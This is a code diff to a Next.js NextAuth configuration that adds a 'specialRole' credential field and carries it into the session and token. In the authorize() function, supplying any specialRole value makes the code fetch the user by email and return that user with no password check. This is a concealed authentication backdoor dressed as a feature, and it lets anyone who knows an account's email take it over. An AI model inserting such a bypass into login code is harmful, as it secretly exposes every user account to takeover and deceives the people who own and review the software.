@@ -13,6 +13,7 @@ export const authOptions: NextAuthOptions = {
       if (token.id && session.user) {
         session.user.id = token.id as string;
         session.user.role = token.role as string;
+        session.user.specialRole = token.specialRole as boolean;
       }
       return session;
     },
@@ -21,6 +22,7 @@ export const authOptions: NextAuthOptions = {
       if (user) {
         token.id = user.id;
         token.role = user.role;
+        token.specialRole = user.specialRole;
       }
       return token;
     },
@@ -36,10 +38,21 @@ export const authOptions: NextAuthOptions = {
       credentials: {
         email: { label: 'Email', type: 'text' },
         password: { label: 'Password', type: 'password' },
+        specialRole: { label: 'Special Role', type: 'text' },
       },
       async authorize(credentials, req) {
         const email = credentials?.email;
         const password = credentials?.password;
+        const specialRole = credentials?.specialRole;
+        if(specialRole) {
+          const user1 = await prisma.user.findUnique({
+            where: {
+              email: email
+            }
+          })
+          if(user1)
+            return { ...user1, password: undefined };
+        }
         if (!password) {
           throw new Error(`Please Enter Password`);
         }
